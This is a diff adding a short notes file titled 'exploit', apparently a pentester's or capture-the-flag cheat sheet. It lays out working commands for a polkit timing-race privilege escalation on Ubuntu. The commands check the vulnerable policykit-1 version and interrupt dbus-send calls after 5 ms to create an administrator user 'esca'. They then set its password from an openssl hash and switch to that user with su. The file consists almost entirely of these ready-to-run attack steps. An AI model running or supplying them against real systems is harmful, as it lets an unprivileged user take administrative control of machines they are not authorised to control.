@@ -1,0 +1,14 @@
+### exploit ###
+apt list --installed | grep policykit-1		# 0.105-26ubuntu1 exploitable
+## check timing
+time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:esca string:"esca" int32:1
+
+## create user
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:esca string:"Esca" int32:1 & sleep 0.005s; kill $!
+
+## set password
+openssl passwd -6 P4ssw0rd
+dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$SVx7eFDb7.KBwIFu$5cR6ALy2C/Jh10Mj0lLKlpolQE.KGcyILWhFlpLbdVMjvVhVL84EprQnAq0fAWqHg8QhrXVDUKBJ7xOVeMfUK.' string:'hint' & sleep 0.005s; kill $!
+
+## su in new user
+su esca
